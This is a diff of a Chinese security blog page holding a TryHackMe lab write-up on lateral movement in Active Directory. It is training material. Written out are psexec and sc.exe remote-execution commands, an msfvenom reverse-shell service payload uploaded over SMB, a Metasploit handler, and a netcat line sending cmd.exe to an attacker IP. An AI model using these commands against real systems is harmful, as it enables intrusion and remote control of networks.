+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Lateral Movement and Pivoting</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-16T03:26:40.901Z" title="发表于 2024-02-16 11:26:40">2024-02-16</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-17T06:56:57.510Z" title="更新于 2024-02-17 14:56:57">2024-02-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">15.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Lateral Movement and Pivoting"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/16/thm-lateral-movement-and-pivoting/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/16/thm-lateral-movement-and-pivoting/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Lateral Movement and Pivoting</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-16T03:26:40.901Z" title="发表于 2024-02-16 11:26:40">2024-02-16</time><time itemprop="dateCreated datePublished" datetime="2024-02-17T06:56:57.510Z" title="更新于 2024-02-17 14:56:57">2024-02-17</time></header><h1 id="0x01-简介">0x01 简介</h1>
 <p>在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具.</p>
 <p>建议在此之前先浏览一下<a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">入侵 AD</a> 和<a target="_blank" rel="noopener" href="https://tryhackme.com/room/adenumeration">枚举 AD</a> 房间。</p>
 <h2 id="学习目标">学习目标</h2>
@@ -157,13 +233,13 @@ Your credentials have been <span class="hljs-attribute">generated</span>: <span 
 <h2 id="什么是横向运动">什么是横向运动？</h2>
 <p>简而言之，横向移动是攻击者用来在网络中移动的一组技术。一旦攻击者获得对网络第一台计算机的访问权，出于多种原因，移动就变得至关重要，其中包括： - 实现攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱和避免被发现。</p>
 <p>虽然许多网络杀伤链将横向移动视为线性过程的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，使我们能够访问新机器，在其中我们可以提升权限并提取凭据（如果可能）。有了新的凭证，循环又开始了。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png" alt="image-20240216115235787"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png" alt="image-20240216115235787"></p>
 <p>通常，我们会重复这个循环几次，然后才能达到网络上的最终目标。如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机，那么我们可能需要横向移动到在网络上拥有更多权限的其他主机。</p>
 <h2 id="一个简单的例子">一个简单的例子</h2>
 <p>假设我们正在执行红队参与，我们的最终目标是到达内部代码存储库，我们通过网络钓鱼活动在目标网络上获得了第一次妥协。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器进行的。</p>
 <p>营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。</p>
 <p>为了到达敏感的主机和服务，我们需要转移到其他主机并从那里转向我们的最终目标。为此，我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一番侦察，我们发现了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它属于公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115300957.png" alt="image-20240216115300957"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115300957.png" alt="image-20240216115300957"></p>
 <p>请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使营销工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从检查登录审核日志的蓝队分析师的角度来看，这种行为的可疑性较小。</p>
 <h2 id="攻击者的视角">攻击者的视角</h2>
 <p>攻击者可以通过多种方式进行横向移动。最简单的方法是使用标准管理协议（例如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。只要在规划与哪个帐户连接的位置时保持一定的一致性，这种方法就可以在某种程度上模拟常规用户的行为。虽然 IT 部门的用户通过 RDP 连接到 Web 服务器可能很常见并且不会受到关注，但必须注意不要尝试可疑的连接（例如，为什么本地管理员用户从营销部门连接到 DEV-001-PC）个人电脑？）.</p>
@@ -191,7 +267,7 @@ Your credentials have been <span class="hljs-attribute">generated</span>: <span 
 <li>连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 <code>C:\Windows\psexesvc.exe</code> 关联。</li>
 <li>创建一些命名管道来处理 stdin/stdout/stderr。</li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115647139.png" alt="image-20240216115647139"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115647139.png" alt="image-20240216115647139"></p>
 <p>要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， <code>psexec64.exe</code> 可在 THMJMP2 中的 <code>C:\tools</code> 下找到）：</p>
 <pre><code class="hljs scss">psexec64<span class="hljs-selector-class">.exe</span> \\MACHINE_IP -u Administrator -<span class="hljs-selector-tag">p</span> Mypass123 -<span class="hljs-selector-tag">i</span> cmd<span class="hljs-selector-class">.exe</span></code></pre>
 <h2 id="使用-winrm-远程创建进程">使用 WinRM 远程创建进程</h2>
@@ -227,11 +303,11 @@ Your credentials have been <span class="hljs-attribute">generated</span>: <span 
 <ol>
 <li>将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。</li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120249867.png" alt="image-20240216120249867"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120249867.png" alt="image-20240216120249867"></p>
 <ol start="2">
 <li>如果后一个连接失败，sc 将尝试通过端口 445 (SMB) 或 139（基于 NetBIOS 的 SMB）上的 SMB 命名管道到达 SVCCTL。</li>
 </ol>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120302427.png" alt="image-20240216120302427"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120302427.png" alt="image-20240216120302427"></p>
 <p>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p>
 <pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
 sc<span class="hljs-selector-class">.exe</span> \\TARGET start THMservice</code></pre>
@@ -259,7 +335,7 @@ schtasks /s TARGET /run /TN <span class="hljs-string">"THMtask1"</span></code></
 <pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/shell/reverse_tcp -f exe-service LHOST=<span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span> LPORT=<span class="hljs-number">5555</span> -o bcxservice<span class="hljs-selector-class">.exe</span></code></pre>
 <p>然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：</p>
 <pre><code class="hljs SCSS">smbclient -c 'put bcxservice<span class="hljs-selector-class">.exe</span>' -U t1_leonard<span class="hljs-selector-class">.summers</span> -W ZA '<span class="hljs-comment">//thmiis.za.tryhackme.com/admin$/' EZpass4ever</span></code></pre>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121358957.png" alt="image-20240216121358957"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121358957.png" alt="image-20240216121358957"></p>
 <p>上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自 <code>msfconsole</code> 的反向 shell：</p>
 <pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfconsole
 msf6 &gt; use exploit/multi/handler
@@ -271,10 +347,10 @@ msf6 exploit(multi/handler) &gt; exploit
 [*] Started reverse TCP handler on <span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span>:<span class="hljs-number">5555</span></code></pre>
 <p>或者，您可以在 Linux 控制台上运行以下单行代码来执行相同的操作：</p>
 <pre><code class="hljs scss">msfconsole -<span class="hljs-selector-tag">q</span> -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span>; set LPORT <span class="hljs-number">5555</span>;exploit"</code></pre>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121628886.png" alt="image-20240216121628886"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121628886.png" alt="image-20240216121628886"></p>
 <p>由于 <code>sc.exe</code> 不允许我们在命令中指定凭据，因此我们需要使用 <code>runas</code> 使用 t1_leonard.summer 的访问令牌生成一个新 shell。尽管如此，我们只能通过 SSH 访问计算机，因此如果我们尝试类似 <code>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</code> 的内容，新的命令提示符将在用户会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell：</p>
 <pre><code class="hljs scss">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers <span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe 10.50.46.236 6666"</span></code></pre>
